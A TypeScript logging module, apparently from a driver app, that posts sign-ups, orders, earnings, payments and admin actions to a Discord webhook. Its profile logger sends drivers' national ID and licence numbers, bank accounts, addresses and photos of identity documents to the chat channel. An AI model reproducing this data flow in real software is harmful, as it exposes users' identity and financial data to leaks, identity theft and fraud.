const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL || ''

interface DiscordLog {
  title: string
  description: string
  fields?: { name: string; value: string; inline?: boolean }[]
  color?: number
  imageUrl?: string
  thumbnailUrl?: string
}

export async function sendDiscordLog(log: DiscordLog) {
  if (!DISCORD_WEBHOOK_URL) return

  const embed: any = {
    title: log.title,
    description: log.description,
    color: log.color || 0x00b050,
    timestamp: new Date().toISOString(),
    footer: { text: 'Order Receiving Screen - Activity Log' },
  }

  if (log.fields) embed.fields = log.fields
  if (log.imageUrl) embed.image = { url: log.imageUrl }
  if (log.thumbnailUrl) embed.thumbnail = { url: log.thumbnailUrl }

  try {
    await fetch(DISCORD_WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ embeds: [embed] }),
    })
  } catch (e) {
    console.error('[Discord Webhook] Failed:', e)
  }
}

export async function logSignUp(userId: string, name: string, email: string) {
  await sendDiscordLog({
    title: '📝 USER SIGN UP',
    description: `Pengguna baru mendaftar`,
    color: 0x5865f2,
    fields: [
      { name: 'User ID', value: userId, inline: true },
      { name: 'Nama', value: name, inline: true },
      { name: 'Email', value: email, inline: false },
    ],
  })
}

export async function logSignIn(userId: string, name: string, email: string) {
  await sendDiscordLog({
    title: '🔑 USER SIGN IN',
    description: `Pengguna masuk ke aplikasi`,
    color: 0x00b050,
    fields: [
      { name: 'User ID', value: userId, inline: true },
      { name: 'Nama', value: name, inline: true },
      { name: 'Email', value: email, inline: false },
    ],
  })
}

export async function logProfileCreated(profile: any, vehicle: any) {
  const fields: any[] = [
    { name: 'User ID', value: profile.userId, inline: true },
    { name: 'Nama', value: profile.name || '-', inline: true },
    { name: 'Email', value: profile.email || '-', inline: true },
    { name: 'Phone', value: profile.phone || '-', inline: true },
    { name: 'Kota', value: profile.city || 'Jakarta', inline: true },
    { name: 'NIK', value: profile.nik ? `||${profile.nik}||` : '-', inline: true },
    { name: 'No SIM', value: profile.simNumber ? `||${profile.simNumber}||` : '-', inline: true },
    { name: 'Alamat', value: profile.address || '-', inline: false },
    { name: 'Kontak Darurat', value: profile.emergencyContact || '-', inline: true },
    { name: 'Bank', value: `${profile.bankName || '-'} : ${profile.bankAccount ? `||${profile.bankAccount}||` : '-'}`, inline: false },
  ]

  if (vehicle) {
    fields.push(
      { name: 'Kendaraan', value: `${vehicle.brand || '-'} ${vehicle.model || '-'}`, inline: true },
      { name: 'Plat Nomor', value: vehicle.plateNumber || '-', inline: true },
      { name: 'Tipe', value: vehicle.type || 'motorcycle', inline: true },
    )
  }

  await sendDiscordLog({
    title: '👤 DRIVER PROFILE CREATED',
    description: `Driver profile telah dibuat`,
    color: 0x00b050,
    fields,
    thumbnailUrl: profile.photoSelfie || undefined,
  })

  // Kirim foto-foto jika ada
  const photos: { label: string; url: string }[] = [
    { label: 'Selfie', url: profile.photoSelfie },
    { label: 'KTP', url: profile.photoKtp },
    { label: 'SIM', url: profile.photoSim },
    { label: 'STNK', url: profile.photoStnk },
    { label: 'Kendaraan', url: profile.photoVehicle },
  ]

  for (const photo of photos) {
    if (photo.url) {
      await sendDiscordLog({
        title: `📸 Foto ${photo.label}`,
        description: `Foto ${photo.label} dari ${profile.name || profile.userId}`,
        color: 0xffd700,
        imageUrl: photo.url,
      })
    }
  }
}

export async function logOrderStatus(orderId: number, userId: string, status: string, details?: any) {
  await sendDiscordLog({
    title: `🚗 ORDER ${status.toUpperCase()}`,
    description: `Order #${orderId} berubah status menjadi **${status}**`,
    color: status === 'completed' ? 0x00b050 : status === 'cancelled' ? 0xff0000 : 0xffa500,
    fields: [
      { name: 'Order ID', value: `#${orderId}`, inline: true },
      { name: 'User ID', value: userId, inline: true },
      { name: 'Status', value: status, inline: true },
      ...(details ? [
        { name: 'Customer', value: details.customerName || '-', inline: true },
        { name: 'Tarif', value: details.fare ? `Rp ${details.fare.toLocaleString()}` : '-', inline: true },
        { name: 'Rute', value: `${details.pickupAddress || '-'} → ${details.dropoffAddress || '-'}`, inline: false },
      ] : []),
    ],
  })
}

export async function logToggleOnline(userId: string, isOnline: boolean) {
  await sendDiscordLog({
    title: isOnline ? '🟢 DRIVER ONLINE' : '🔴 DRIVER OFFLINE',
    description: `Driver ${isOnline ? 'online' : 'offline'}`,
    color: isOnline ? 0x00b050 : 0xff0000,
    fields: [
      { name: 'User ID', value: userId, inline: true },
      { name: 'Status', value: isOnline ? 'Online' : 'Offline', inline: true },
    ],
  })
}

export async function logEarning(userId: string, amount: number, description: string, type: string) {
  await sendDiscordLog({
    title: type === 'withdrawal' ? '💸 WITHDRAWAL' : '💰 EARNING',
    description: `Transaksi: ${description}`,
    color: type === 'withdrawal' ? 0xff6b35 : 0x00b050,
    fields: [
      { name: 'User ID', value: userId, inline: true },
      { name: 'Tipe', value: type, inline: true },
      { name: 'Jumlah', value: `${amount > 0 ? '+' : ''}Rp ${amount.toLocaleString()}`, inline: true },
    ],
  })
}

export async function logActivationPayment(userId: string, amount: number) {
  await sendDiscordLog({
    title: '🌟 VIP ACTIVATION',
    description: `Driver melakukan aktivasi VIP`,
    color: 0xffd700,
    fields: [
      { name: 'User ID', value: userId, inline: true },
      { name: 'Nominal', value: `Rp ${amount.toLocaleString()}`, inline: true },
      { name: 'Status', value: '✅ Lunas', inline: true },
    ],
  })
}

export async function logAdminAction(action: string, adminId: string, details?: any) {
  await sendDiscordLog({
    title: `⚙️ ADMIN ACTION: ${action}`,
    description: `Admin melakukan aksi`,
    color: 0x9b59b6,
    fields: [
      { name: 'Admin ID', value: adminId, inline: true },
      { name: 'Aksi', value: action, inline: true },
      ...(details ? Object.entries(details).map(([k, v]) => ({ name: k, value: String(v), inline: true })) : []),
    ],
  })
}